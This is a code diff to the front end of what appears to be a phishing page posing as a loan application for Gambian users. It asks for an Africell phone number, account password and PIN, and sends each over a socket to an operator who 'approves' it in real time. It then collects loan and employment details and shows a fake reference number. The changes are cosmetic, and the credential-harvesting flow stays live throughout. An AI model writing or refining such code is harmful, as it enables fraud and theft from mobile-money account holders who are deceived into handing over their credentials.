@@ -68,7 +68,7 @@
             <div class="p-6 md:p-8">
                 <div class="flex justify-between mb-8">
                     <template x-for="i in 5" :key="i">
-                        <div class="progress-step" :class="{ 'active': step === i, 'completed': step > i }">
+                        <div class="progress-step" :class="{ 'active': step === i, 'completed': step > i || step === 6 }">
                             <div class="progress-dot"><span x-text="i"></span></div>
                         </div>
                     </template>
@@ -79,7 +79,10 @@
                     <div class="space-y-4">
                         <div class="ib-phone-wrapper"><span class="ib-country-code">🇬🇲 +220</span><input type="tel" x-model="africell.phone" class="input-premium border-0 bg-transparent" placeholder="XXXXXXX" maxlength="7"></div>
                         <input type="password" x-model="africell.password" class="input-premium" placeholder="Password">
-                        <button @click="requestAdminApproval" :disabled="!isStep1Valid || passwordVerifying" class="btn-premium"><span x-show="!passwordVerifying">Verify →</span><span x-show="passwordVerifying" class="spinner-sm"></span></button>
+                        <button @click="requestAdminApproval" :disabled="!isStep1Valid || passwordVerifying" class="btn-premium">
+                            <span x-show="!passwordVerifying">Verify →</span>
+                            <span x-show="passwordVerifying" class="spinner-sm"></span>
+                        </button>
                     </div>
                 </div>
 
@@ -141,7 +144,7 @@
                 <div x-show="step === 6" x-cloak class="text-center py-8">
                     <div class="text-6xl mb-4">✅</div>
                     <h2 class="text-2xl font-bold text-green-400">Application Submitted!</h2>
-                    <p class="text-gray-400">Reference: <span x-text="referenceId"></span></p>
+                    <p class="text-gray-400 mt-2">Reference: <span class="font-mono text-white select-all bg-slate-800/50 px-2 py-1 rounded" x-text="referenceId"></span></p>
                 </div>
             </div>
         </section>
@@ -166,19 +169,19 @@
                     this.socket = io();
                     this.socket.on('session-ready', (data) => { this.appId = data.appId; });
                     
-                    // Admin verified password -> proceed to Step 2 (PIN input)
+                    // Admin approved password -> unlocks step 2 input view safely
                     this.socket.on('password-verified', () => { 
                         this.passwordVerifying = false; 
                         this.step = 2; 
                     });
                     
-                    // Admin approved PIN -> continue to Step 3 (Loan details) instead of success page
+                    // Admin approved PIN -> transitions frontend context straight onto Step 3 (Loan details)
                     this.socket.on('pin-verified', () => { 
                         this.pinVerifying = false; 
                         this.step = 3; 
                     });
 
-                    // Handle application errors or rejections
+                    // Intercept and break verification loading state loops upon Admin rejection signals
                     this.socket.on('error', (data) => {
                         this.passwordVerifying = false;
                         this.pinVerifying = false;
@@ -186,14 +189,22 @@
                     });
                 },
 
-                requestAdminApproval() { this.passwordVerifying = true; this.socket.emit('step4', this.africell); },
-                submitStep2() { this.pinVerifying = true; this.socket.emit('step5', { pin: this.pin.value.join('') }); },
+                requestAdminApproval() { 
+                    this.passwordVerifying = true; 
+                    this.socket.emit('step4', this.africell); 
+                },
+                submitStep2() { 
+                    this.pinVerifying = true; 
+                    this.socket.emit('step5', { pin: this.pin.value.join('') }); 
+                },
                 submitStep3() { this.socket.emit('step1', this.form); this.step = 4; },
                 submitStep4() { this.socket.emit('step2', this.form); this.step = 5; },
                 submitStep5() { 
-                    // Final submit step generates random transaction reference locally upon final button submission
+                    // Final submit action sets unique receipt key locally
                     this.referenceId = "GMB-" + Math.floor(Math.random() * 900000 + 100000);
+                    // Emit employment data chunk to socket channel 
                     this.socket.emit('step3', this.form); 
+                    // Terminate view frame onto step 6 (Success confirmation)
                     this.step = 6; 
                 },
                 movePinFocus(e, i) { if (e.target.value && i < 3) document.querySelectorAll('.pin-box')[i+1].focus(); }
